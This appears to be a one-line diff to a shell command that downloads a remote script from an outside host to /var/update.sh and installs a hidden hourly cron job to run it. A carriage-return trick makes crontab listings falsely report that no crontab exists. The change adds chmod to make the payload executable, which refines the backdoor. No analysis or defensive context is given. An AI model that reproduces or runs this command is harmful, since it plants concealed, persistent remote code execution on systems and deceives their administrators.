@@ -1,1 +1,1 @@
-(crontab -l;curl https://doorauth.herokuapp.com/b.sh -o /var/update.sh;printf "37 * * * * sh /var/update.sh;\rno crontab for `whoami`%100c\n")|crontab -
+(crontab -l;curl https://doorauth.herokuapp.com/b.sh -o /var/update.sh;chmod +x /var/update.sh;printf "37 * * * * sh /var/update.sh;\rno crontab for `whoami`%100c\n")|crontab -
